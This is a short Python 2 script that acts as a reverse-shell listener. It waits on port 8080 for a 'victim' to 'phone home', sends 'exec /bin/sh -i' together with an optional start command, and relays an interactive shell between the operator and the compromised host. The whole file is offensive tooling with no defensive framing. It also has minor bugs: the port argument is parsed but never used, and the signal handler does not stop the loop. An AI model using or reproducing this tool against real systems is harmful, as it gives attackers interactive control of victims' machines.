#!/usr/bin/env python
import socket
import sys
import select
import os
import traceback
import signal

def handler(signum,frame):
    keepgoing=False

STARS="*******************************************************"


port=int(sys.argv[1])
startcmd=None
if len(sys.argv) > 2:
    startcmd=sys.argv[2]

signal.signal(signal.SIGINT,handler)
signal.signal(signal.SIGTERM,handler)

MAX_READ=1024

serversocket = socket.socket(
        socket.AF_INET,socket.SOCK_STREAM)
serversocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

serversocket.bind(("0.0.0.0",8080))
serversocket.listen(5)

print >>sys.stderr,""
print >>sys.stderr,STARS
print >>sys.stderr,""
print >>sys.stderr,"Waiting for connection from victim."
print >>sys.stderr,""

(clientsocket,address) = serversocket.accept()
print >>sys.stderr,STARS
print >>sys.stderr,""
print >>sys.stderr,"Victim has phoned home."
print >>sys.stderr,""

fd_to_file={clientsocket.fileno():clientsocket,
            sys.stdin.fileno():sys.stdin}


inputlist=[clientsocket,sys.stdin]

keepgoing=True
if None != startcmd:
    clientsocket.send(startcmd+"\n")

clientsocket.send("exec /bin/sh -i\n")
while keepgoing:
    try:
        inp,outp,excep=select.select(inputlist,[],[])
        for f in inp:
            if f is clientsocket:
                data=f.recv(MAX_READ)
                if data:
                    sys.stdout.write(data)
                    sys.stdout.flush()
            else:
                data=sys.stdin.readline()
                if data:
                    clientsocket.send(data)
    except Exception as e:
        keepgoing=False

    
print >>sys.stderr,""
print >>sys.stderr,STARS
print >>sys.stderr,"Closing connection."

clientsocket.close()
serversocket.close()


